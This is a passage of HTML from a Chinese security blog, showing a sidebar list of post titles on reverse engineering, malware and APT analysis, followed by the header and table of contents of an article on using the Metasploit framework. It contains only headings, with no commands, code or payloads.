           href="/2022/09/29/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%B9%8BNDK%E5%BC%80%E5%8F%91/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="NDK开发">NDK开发</span>
            <span class="post-date" title="2022-09-29 14:42:34">2022/09/29</span>
        </a>
        
        
        <a  class="All 安卓逆向 "
           href="/2022/09/27/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98%E4%BF%AE%E6%94%B9%E8%B5%84%E6%BA%90%E5%8E%BB%E5%B9%BF%E5%91%8A01/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="安卓逆向实战修改资源去广告01">安卓逆向实战修改资源去广告01</span>
            <span class="post-date" title="2022-09-27 19:46:34">2022/09/27</span>
        </a>
        
        
        <a  class="All 安卓逆向 入门手册 "
           href="/2022/09/26/%E9%80%9A%E8%BF%87%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0smali%E6%B1%87%E7%BC%96/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="smali与dalvik指令">smali与dalvik指令</span>
            <span class="post-date" title="2022-09-26 15:50:15">2022/09/26</span>
        </a>
        
        
        <a  class="All 安卓逆向 入门手册 "
           href="/2022/09/23/%E5%9F%BA%E4%BA%8EAndroid%E7%9A%84ARM%E6%B1%87%E7%BC%96/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="基于Android的ARM汇编">基于Android的ARM汇编</span>
            <span class="post-date" title="2022-09-23 15:17:52">2022/09/23</span>
        </a>
        
        
        <a  class="All 安卓逆向 入门手册 "
           href="/2022/09/21/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%B9%8BAPK%E6%89%93%E5%8C%85%E6%B5%81%E7%A8%8B/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="安卓逆向之APK打包流程">安卓逆向之APK打包流程</span>
            <span class="post-date" title="2022-09-21 10:17:44">2022/09/21</span>
        </a>
        
        
        <a  class="All 安卓逆向 入门手册 "
           href="/2022/09/19/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%B9%8B%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="安卓逆向之安卓开发">安卓逆向之安卓开发</span>
            <span class="post-date" title="2022-09-19 17:18:12">2022/09/19</span>
        </a>
        
        
        <a  class="All 安卓逆向 入门手册 "
           href="/2022/09/16/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%B9%8Bjava%E5%9F%BA%E7%A1%80/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="安卓逆向之java基础">安卓逆向之java基础</span>
            <span class="post-date" title="2022-09-16 18:02:04">2022/09/16</span>
        </a>
        
        
        <a  class="All IOT "
           href="/2022/09/01/IOT%E5%88%9D%E6%8E%A2/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="iot初探">iot初探</span>
            <span class="post-date" title="2022-09-01 14:51:06">2022/09/01</span>
        </a>
        
        
        <a  class="All 漏洞研究 漏洞相关知识 "
           href="/2022/09/01/win%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="漏洞利用原理">漏洞利用原理</span>
            <span class="post-date" title="2022-09-01 11:16:25">2022/09/01</span>
        </a>
        
        
        <a  class="All 漏洞研究 "
           href="/2022/08/31/CVE-2010-2883%E5%A4%8D%E7%8E%B0/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CVE-2010-2883_Adobe Reader TTF字体SING表栈溢出漏洞复现">CVE-2010-2883_Adobe Reader TTF字体SING表栈溢出漏洞复现</span>
            <span class="post-date" title="2022-08-31 17:35:30">2022/08/31</span>
        </a>
        
        
        <a  class="All "
           href="/2022/08/23/APT_Shamoon/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="关于Shamoon.APT组织的一次完整攻击链分析">关于Shamoon.APT组织的一次完整攻击链分析</span>
            <span class="post-date" title="2022-08-23 10:12:17">2022/08/23</span>
        </a>
        
        
        <a  class="All 应急响应 "
           href="/2022/08/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="日志分析">日志分析</span>
            <span class="post-date" title="2022-08-16 17:04:55">2022/08/16</span>
        </a>
        
        
        <a  class="All 应急响应 "
           href="/2022/08/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94everything%E6%96%87%E4%BB%B6%E8%BF%87%E6%BB%A4/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="everything文件过滤">everything文件过滤</span>
            <span class="post-date" title="2022-08-16 16:22:03">2022/08/16</span>
        </a>
        
        
        <a  class="All APT研究 APT-C-26（Lazarus） "
           href="/2022/08/12/Lazarus%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E8%88%AA%E7%A9%BA%E8%88%AA%E5%A4%A9%E8%A1%8C%E4%B8%9A%E7%9A%84%E6%94%BB%E5%87%BB/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Lazarus一次针对航空航天行业的攻击">Lazarus一次针对航空航天行业的攻击</span>
            <span class="post-date" title="2022-08-12 15:02:59">2022/08/12</span>
        </a>
        
        
        <a  class="All APT研究 APT-C-08(蔓灵花) "
           href="/2022/08/11/BITTER%E7%BB%84%E7%BB%87%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="BITTER组织样本分析1">BITTER组织样本分析1</span>
            <span class="post-date" title="2022-08-11 16:06:21">2022/08/11</span>
        </a>
        
        
        <a  class="All 技术研究 "
           href="/2022/07/19/%E7%88%AC%E8%99%AB/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="爬虫">爬虫</span>
            <span class="post-date" title="2022-07-19 16:12:19">2022/07/19</span>
        </a>
        
        
        <a  class="All "
           href="/2022/07/15/Google_Hacking_%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Google_Hacking_谷歌搜索引擎">Google_Hacking_谷歌搜索引擎</span>
            <span class="post-date" title="2022-07-15 09:56:40">2022/07/15</span>
        </a>
        
        
        <a  class="All 恶意代码分析 "
           href="/2022/07/13/2022-7-13-exe/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="个人简历.exe">个人简历.exe</span>
            <span class="post-date" title="2022-07-13 09:12:38">2022/07/13</span>
        </a>
        
        
        <a  class="All 技术研究 "
           href="/2022/07/06/%E5%88%9D%E5%85%A5Yara/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Yara入门">Yara入门</span>
            <span class="post-date" title="2022-07-06 16:14:17">2022/07/06</span>
        </a>
        
        
        <a  class="All 恶意代码分析 蠕虫 "
           href="/2022/06/28/2022-06-25_Scar%E6%84%9F%E6%9F%93%E5%BC%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="2022.06.25_Scar感染式样本分析">2022.06.25_Scar感染式样本分析</span>
            <span class="post-date" title="2022-06-28 09:25:02">2022/06/28</span>
        </a>
        
        
        <a  class="All "
           href="/2022/06/27/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="应急响应手册">应急响应手册</span>
            <span class="post-date" title="2022-06-27 15:20:12">2022/06/27</span>
        </a>
        
        
        <a  class="All 恶意代码分析 "
           href="/2022/03/08/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="宏病毒基础入门">宏病毒基础入门</span>
            <span class="post-date" title="2022-03-08 09:23:03">2022/03/08</span>
        </a>
        
        
        <a  class="All 恶意代码分析 勒索病毒 "
           href="/2022/03/07/WannaCry%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="WannaCry病毒分析">WannaCry病毒分析</span>
            <span class="post-date" title="2022-03-07 11:40:13">2022/03/07</span>
        </a>
        
        
        <a  class="All 技术研究 "
           href="/2022/03/03/wireshark/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="wireshark">wireshark</span>
            <span class="post-date" title="2022-03-03 12:18:53">2022/03/03</span>
        </a>
        
        
        <a  class="All APT研究 APT-C-23(双尾蝎) "
           href="/2022/02/27/%E5%8F%8C%E5%B0%BE%E8%9D%8E%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="APT-C-23境外双尾蝎组织样本分析">APT-C-23境外双尾蝎组织样本分析</span>
            <span class="post-date" title="2022-02-27 16:00:07">2022/02/27</span>
        </a>
        
        
        <a  class="All 应急响应 "
           href="/2022/02/24/%E8%AE%B0%E5%BD%95%E6%A0%A1%E5%9B%ADMAC%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="记录校园MAC挖矿病毒">记录校园MAC挖矿病毒</span>
            <span class="post-date" title="2022-02-24 20:04:18">2022/02/24</span>
        </a>
        
        
        <a  class="All 恶意代码分析 蠕虫 "
           href="/2022/02/24/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="熊猫烧香分析">熊猫烧香分析</span>
            <span class="post-date" title="2022-02-24 18:09:42">2022/02/24</span>
        </a>
        
        
        <a  class="All win内核 "
           href="/2022/02/20/win%E5%86%85%E6%A0%B8%E4%B8%8E%E9%A9%B1%E5%8A%A8/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="win内核与驱动">win内核与驱动</span>
            <span class="post-date" title="2022-02-20 08:23:51">2022/02/20</span>
        </a>
        
        
        <a  class="All 技术研究 "
           href="/2022/01/28/PE/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="PE">PE</span>
            <span class="post-date" title="2022-01-28 21:26:29">2022/01/28</span>
        </a>
        
        
        <a  class="All 技术研究 "
           href="/2021/04/10/unix%E7%8E%AF%E5%A2%83%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="unix环境高级编程">unix环境高级编程</span>
            <span class="post-date" title="2021-04-10 14:54:25">2021/04/10</span>
        </a>
        
        
        <a  class="All 技术研究 "
           href="/2021/03/29/codeql%E5%88%9D%E5%85%A5/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="codeql初入">codeql初入</span>
            <span class="post-date" title="2021-03-29 14:14:01">2021/03/29</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>

    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="切换全屏 快捷键 s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-使用METASPLOIT框架" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">使用METASPLOIT框架</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            <i class="iconfont icon-category"></i>
            
            
            <a  data-rel="渗透测试">渗透测试</a> > 
            
            <a  data-rel="渗透测试&lt;---&gt;HTB">HTB</a>
            
        </span>
        
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2023-10-27 10:58:33'>2023-04-23 16:53</time>
        
    </div>
    <div class="article-meta">
        
        
        <span id="busuanzi_container_page_pv">
            Views 👀 :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%AA%E5%BE%8B"><span class="toc-text">纪律</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-text">结论</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit%E7%AE%80%E4%BB%8B"><span class="toc-text">Metasploit简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit-Pro"><span class="toc-text">Metasploit Pro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit-%E6%A1%86%E6%9E%B6%E6%8E%A7%E5%88%B6%E5%8F%B0"><span class="toc-text">Metasploit 框架控制台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E6%9E%B6%E6%9E%84"><span class="toc-text">了解架构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E3%80%81%E6%96%87%E6%A1%A3%E3%80%81%E5%BA%93"><span class="toc-text">数据、文档、库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97"><span class="toc-text">模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6"><span class="toc-text">插件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-text">脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-text">工具</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E6%8E%A7%E5%88%B6%E5%8F%B0%E7%AE%80%E4%BB%8B"><span class="toc-text">MSF控制台简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-text">准备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-MSF"><span class="toc-text">安装 MSF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-%E5%8F%82%E4%B8%8E%E7%BB%93%E6%9E%84"><span class="toc-text">MSF 参与结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97-1"><span class="toc-text">模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%A5%E6%B3%95"><span class="toc-text">句法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-text">例子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B4%A2%E5%BC%95%E5%8F%B7"><span class="toc-text">索引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B"><span class="toc-text">类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-text">操作系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#servive"><span class="toc-text">servive</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#name"><span class="toc-text">name</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97"><span class="toc-text">搜索模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD"><span class="toc-text">MSF - 搜索功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E5%AF%BB%E6%89%BE%E6%B0%B8%E6%81%92%E7%9A%84%E6%B5%AA%E6%BC%AB"><span class="toc-text">MSF - 寻找永恒的浪漫</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E7%89%B9%E5%AE%9A%E6%90%9C%E7%B4%A2"><span class="toc-text">MSF - 特定搜索</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E9%80%89%E6%8B%A9"><span class="toc-text">模块选择</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E6%90%9C%E7%B4%A2-MS17-010"><span class="toc-text">MSF - 搜索 MS17_010</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-text">使用模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E9%80%89%E6%8B%A9%E6%A8%A1%E5%9D%97"><span class="toc-text">MSF - 选择模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E6%A8%A1%E5%9D%97%E4%BF%A1%E6%81%AF"><span class="toc-text">MSF - 模块信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E7%9B%AE%E6%A0%87%E8%A7%84%E8%8C%83"><span class="toc-text">MSF - 目标规范</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E6%B0%B8%E4%B9%85%E7%9B%AE%E6%A0%87%E8%A7%84%E8%8C%83"><span class="toc-text">MSF - 永久目标规范</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E5%88%A9%E7%94%A8%E6%89%A7%E8%A1%8C"><span class="toc-text">MSF - 利用执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E7%9B%AE%E6%A0%87%E4%BA%A4%E4%BA%92"><span class="toc-text">MSF - 目标交互</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87"><span class="toc-text">目标</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E6%98%BE%E7%A4%BA%E7%9B%AE%E6%A0%87"><span class="toc-text">MSF - 显示目标</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E7%9B%AE%E6%A0%87"><span class="toc-text">选择目标</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E7%9B%AE%E6%A0%87%E9%80%89%E6%8B%A9"><span class="toc-text">MSF - 目标选择</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E7%B1%BB%E5%9E%8B"><span class="toc-text">目标类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-text">有效载荷</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Singles"><span class="toc-text">Singles</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stager"><span class="toc-text">stager</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stages"><span class="toc-text">stages</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E9%98%B6%E6%AE%B5%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-text">分阶段有效载荷</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E5%88%86%E9%98%B6%E6%AE%B5%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-text">MSF - 分阶段有效载荷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter-%E8%BD%BD%E8%8D%B7"><span class="toc-text">Meterpreter 载荷</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-text">搜索有效载荷</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E5%88%97%E5%87%BA%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-text">MSF - 列出有效载荷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E6%90%9C%E7%B4%A2%E7%89%B9%E5%AE%9A%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-text">MSF - 搜索特定有效载荷</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-text">选择有效载荷</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E9%80%89%E6%8B%A9%E8%B4%9F%E8%BD%BD"><span class="toc-text">MSF - 选择负载</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%B4%9F%E8%BD%BD"><span class="toc-text">使用负载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E5%88%A9%E7%94%A8%E5%92%8C%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E9%85%8D%E7%BD%AE"><span class="toc-text">MSF - 利用和有效负载配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-Meterpreter-%E5%91%BD%E4%BB%A4"><span class="toc-text">MSF - Meterpreter 命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-Meterpreter-%E5%AF%BC%E8%88%AA"><span class="toc-text">MSF - Meterpreter 导航</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-Windows-CMD"><span class="toc-text">MSF-Windows CMD</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7%E7%B1%BB%E5%9E%8B"><span class="toc-text">有效载荷类型</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E5%99%A8"><span class="toc-text">编码器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E7%BC%96%E7%A0%81%E5%99%A8"><span class="toc-text">选择编码器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7-%E6%97%A0%E7%BC%96%E7%A0%81"><span class="toc-text">生成有效载荷 - 无编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7-%E4%BD%BF%E7%94%A8%E7%BC%96%E7%A0%81"><span class="toc-text">生成有效载荷 - 使用编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%BD%E7%95%8C%E5%8C%BB%E7%94%9F-VirusTotal"><span class="toc-text">无国界医生 - VirusTotal</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">设置数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PostgreSQL-%E7%8A%B6%E6%80%81"><span class="toc-text">PostgreSQL 状态</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8-PostgreSQL"><span class="toc-text">启动 PostgreSQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E5%90%AF%E5%8A%A8%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">MSF - 启动数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E8%BF%9E%E6%8E%A5%E5%88%B0%E5%90%AF%E5%8A%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">MSF - 连接到启动的数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E9%87%8D%E6%96%B0%E5%90%AF%E5%8A%A8%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">MSF - 重新启动数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%80%89%E9%A1%B9"><span class="toc-text">MSF - 数据库选项</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">使用数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8C%BA"><span class="toc-text">工作区</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C"><span class="toc-text">导入扫描结果</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8-Nmap-%E6%89%AB%E6%8F%8F"><span class="toc-text">存储 Nmap 扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C-1"><span class="toc-text">导入扫描结果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8-MSF-%E6%8E%A7%E5%88%B6%E5%8F%B0%E4%B8%AD%E4%BD%BF%E7%94%A8-Nmap"><span class="toc-text">在 MSF 控制台中使用 Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%BD%E7%95%8C%E5%8C%BB%E7%94%9F-Nmap"><span class="toc-text">无国界医生-Nmap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD"><span class="toc-text">数据备份</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%BC%E5%87%BA"><span class="toc-text">MSF - 数据库导出</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%8C%81"><span class="toc-text">主持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E5%AD%98%E5%82%A8%E4%B8%BB%E6%9C%BA"><span class="toc-text">MSF - 存储主机</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1"><span class="toc-text">服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1"><span class="toc-text">MSF - 主机的存储服务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6"><span class="toc-text">证书</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E5%AD%98%E5%82%A8%E5%87%AD%E8%AF%81"><span class="toc-text">MSF - 存储凭证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A2%E5%8A%AB"><span class="toc-text">抢劫</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E2%80%93-%E5%AD%98%E5%82%A8%E6%88%98%E5%88%A9%E5%93%81"><span class="toc-text">MSF– 存储战利品</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6-1"><span class="toc-text">插件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%8F%92%E4%BB%B6"><span class="toc-text">使用插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E5%8A%A0%E8%BD%BD-Nessus"><span class="toc-text">MSF - 加载 Nessus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E6%96%B0%E6%8F%92%E4%BB%B6"><span class="toc-text">安装新插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD-MSF-%E6%8F%92%E4%BB%B6"><span class="toc-text">下载 MSF 插件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E5%B0%86%E6%8F%92%E4%BB%B6%E5%A4%8D%E5%88%B6%E5%88%B0-MSF"><span class="toc-text">MSF - 将插件复制到 MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6"><span class="toc-text">MSF - 加载插件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B7%E5%85%A5"><span class="toc-text">混入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sessions"><span class="toc-text">Sessions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 